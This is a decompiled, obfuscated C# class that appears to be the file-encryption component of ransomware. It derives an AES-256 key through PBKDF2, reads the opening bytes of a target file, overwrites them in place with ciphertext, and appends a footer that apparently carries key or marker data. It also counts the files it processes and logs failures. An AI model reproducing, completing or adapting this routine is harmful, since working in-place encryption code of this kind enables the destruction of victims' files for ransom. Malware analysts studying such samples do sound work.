using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bmDbQpaZORfnY;

public static class KpGxARzmOhh
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] hFniFSRZbJWsGd(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = onXzyWZYSIKT(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes onXzyWZYSIKT(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] VRtoBnWLnEyOffOBW(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (qMBmfvOoVnw.BfrRvpyDja == getString_0(107396995))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (qMBmfvOoVnw.XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(qMBmfvOoVnw.yOCAHBSkOQrG, getString_0(107388610) + string_0 + getString_0(107402132) + ex.Message + getString_0(107396431));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool mQuEGeDjhvV(string uiFpUcfJDScOD, byte[] XCiesfIreL, byte[] mAsQTvANrOMVS = null)
	{
		try
		{
			byte[] array = null;
			if (qMBmfvOoVnw.BfrRvpyDja == getString_0(107396995))
			{
				array = (qMBmfvOoVnw.HtEoifwVYHx ? Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074))) : Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(uiFpUcfJDScOD, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(XCiesfIreL, 0, XCiesfIreL.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(uiFpUcfJDScOD, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!qMBmfvOoVnw.HtEoifwVYHx)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(mAsQTvANrOMVS, 0, mAsQTvANrOMVS.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (qMBmfvOoVnw.HtEoifwVYHx ? Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074))) : Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115))));
				FileStream fileStream2 = new FileStream(uiFpUcfJDScOD, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(XCiesfIreL, 0, XCiesfIreL.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(uiFpUcfJDScOD, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!qMBmfvOoVnw.HtEoifwVYHx)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(mAsQTvANrOMVS, 0, mAsQTvANrOMVS.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			qMBmfvOoVnw.JsWoTAjDEfI++;
		}
		catch (Exception ex)
		{
			if (qMBmfvOoVnw.XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(qMBmfvOoVnw.yOCAHBSkOQrG, getString_0(107388610) + uiFpUcfJDScOD + getString_0(107402065) + ex.Message + getString_0(107396431));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (qMBmfvOoVnw.HtEoifwVYHx ? Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402074))) : Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(qMBmfvOoVnw.zYroySqbtjDyt) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115)) + Convert.ToString(qMBmfvOoVnw.DtPlrxKatW) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402115))));
				FileStream fileStream4 = new FileStream(uiFpUcfJDScOD, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(XCiesfIreL, 0, XCiesfIreL.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(uiFpUcfJDScOD, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!qMBmfvOoVnw.HtEoifwVYHx)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(mAsQTvANrOMVS, 0, mAsQTvANrOMVS.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static KpGxARzmOhh()
	{
		Strings.CreateGetStringDelegate(typeof(KpGxARzmOhh));
	}
}
